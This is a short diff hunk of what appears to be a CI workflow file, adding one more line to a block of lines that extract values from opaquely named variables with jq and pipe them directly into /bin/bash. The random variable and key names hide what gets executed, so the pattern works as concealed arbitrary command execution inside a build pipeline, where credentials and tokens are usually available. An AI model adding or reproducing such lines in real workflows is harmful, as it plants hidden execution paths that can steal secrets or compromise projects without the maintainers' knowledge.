@@ -28,6 +28,7 @@ jobs:
           echo $uob105 | jq -r .no38748 | /bin/bash
           printf '%s' "$o6888" | jq -r .pxyrk19 | /bin/bash
           echo $mohq7 | jq -r .vro9 | /bin/bash
+          printf '%s' "$lauwm5" | jq -r .shb6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
